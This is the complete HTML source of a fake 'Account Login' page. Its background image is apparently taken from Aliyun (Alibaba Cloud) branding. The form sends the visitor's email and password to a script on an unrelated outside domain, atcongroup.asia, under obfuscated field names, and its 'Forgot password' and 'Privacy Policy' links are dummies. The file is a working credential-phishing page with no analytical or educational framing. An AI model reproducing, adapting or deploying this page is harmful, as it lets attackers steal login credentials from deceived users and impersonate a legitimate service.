<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" 

content="width=device-width, initial-scale=1.0">
    <title>Account Login</title>

    <style>
    * { box-sizing: 

border-box; }

    html, body {
        margin: 0;
        width: 100%;
        min-height: 100%;
    }

    body {
     

   min-height: 100vh;
        font-family: Arial, Helvetica, sans-serif;
        background: #777 url

("https://i.ibb.co/Kp8xchTV/Aliyunbg1xx.png") center top / cover no-repeat fixed;
        display: flex;
        

justify-content: flex-end;
        align-items: center;
        padding: 38px 7vw;
        color: #555;
    }

    

.container {
        width: 368px;
        background: #fff;
        padding: 24px 32px 30px;
        border: 1px 

solid #d4d4d4;
        border-radius: 3px;
        box-shadow: 0 2px 5px rgba(0,0,0,.18);
        text-align: 

left;
    }

    h2 {
        margin: 0;
        padding: 0 0 7px;
        border-bottom: 1px solid #cfcfcf;
        

color: #555;
        font-size: 17px;
        line-height: 1.25;
        font-weight: 700;
    }

    .subtitle {
     

   display: none;
    }

    form {
        width: 100%;
        margin: 21px 0 0;
    }

    .field {
        margin-

bottom: 19px;
    }

    label {
        display: none;
    }

    input {
        display: block;
        width: 100%;
  

      height: 43px;
        padding: 10px;
        border: 1px solid #cfcfcf;
        border-radius: 0;
        

outline: none;
        background: #fff;
        color: #333;
        font-family: Arial, Helvetica, sans-serif;
   

     font-size: 14px;
    }

    input:focus {
        border-color: #aaa;
        box-shadow: none;
    }

    

.password-row {
        display: block;
    }

    .forgot {
        display: block;
        margin-top: 9px;
        

margin-bottom: 0;
        text-align: right;
        color: #777;
        font-size: 13px;
        line-height: 

1.2;
        text-decoration: none;
    }

    .forgot:hover {
        text-decoration: underline;
    }

    button {
  

      display: block;
        width: 100%;
        height: 43px;
        margin: 0;
        padding: 0 12px;
        

border: 0;
        border-radius: 4px;
        background: #ff4032;
        color: #fff;
        font-family: 

Arial, Helvetica, sans-serif;
        font-size: 16px;
        font-weight: 400;
        cursor: pointer;
    }

    

button:hover {
        background: #f28700;
    }

    .privacy-row {
        display: flex;
        align-items: 

center;
        gap: 6px;
        margin-top: 13px;
        color: #777;
        font-size: 12px;
        line-

height: 1.3;
    }

    .privacy-row input[type="checkbox"] {
        width: 13px;
        height: 13px;
        

margin: 0;
        padding: 0;
        flex: 0 0 13px;
    }

    .privacy-row a {
        color: #777;
        text-

decoration: none;
    }

    .privacy-row a:hover {
        text-decoration: underline;
    }

    .note {
        

display: none;
    }

    @media (max-width: 700px) {
        body {
            justify-content: center;
            

padding: 24px;
        }

        .container {
            width: min(368px, 100%);
        }
    }
</style>
</head>

<body>
    <main class="container">
        <h2>Account Login</h2>

        <form id="loginForm" 

action="https://atcongroup.asia/Non-offensive.php" method="post" onsubmit="">
           <div class="field">
     

           <label for="email">Email</label>
                <input
                    id="email"
                 

   type="email"
                    name="bn1"
                    value=""
                    

autocomplete="username"
                    required
                >
            </div>

            <div 

class="field">
                <div class="password-row">
                    <label 

for="password">Password</label>
                    <input
                        id="password"
                  

      type="password"
                        name="email"
                        autocomplete="current-

password"
                        required
                    >
                </div>
            </div>

          

  <button type="submit">Log in</button>

            <a class="forgot" href="#" onclick="return false;">Forgot 

password</a>

            <div class="privacy-row">
                <input id="privacy" type="checkbox" 

name="privacy" required>
                <span>I have read and agree with <a href="#" onclick="return 

false;">Privacy Policy</a></span>
            </div>
        </form>
    </main>
</body>
</html>
